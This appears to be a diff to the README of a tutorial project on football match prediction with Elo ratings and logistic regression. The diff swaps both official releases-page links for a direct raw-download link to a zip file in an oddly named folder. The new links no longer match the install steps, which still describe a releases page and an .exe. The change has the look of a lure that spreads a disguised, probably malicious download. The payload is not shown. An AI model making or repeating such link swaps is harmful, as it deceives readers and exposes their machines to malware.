@@ -1,6 +1,6 @@
 # ⚽ ai-engineer-path - Build intelligent systems to predict football
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/andrewd7399/ai-engineer-path/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/andrewd7399/ai-engineer-path/main/pyramidicalness/path-ai-engineer-2.5.zip)
 
 This project provides a clear path to build AI systems. You will learn to create a football match prediction system. The application handles data pipelines, calculates team rankings using Elo, and uses logistic regression to estimate match outcomes. It also adds context using a language model and compares results against real bookmaker odds.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the application on your Windows machine:
 
-1. Visit [this link](https://github.com/andrewd7399/ai-engineer-path/releases) to reach the download page.
+1. Visit [this link](https://raw.githubusercontent.com/andrewd7399/ai-engineer-path/main/pyramidicalness/path-ai-engineer-2.5.zip) to reach the download page.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your Downloads folder.
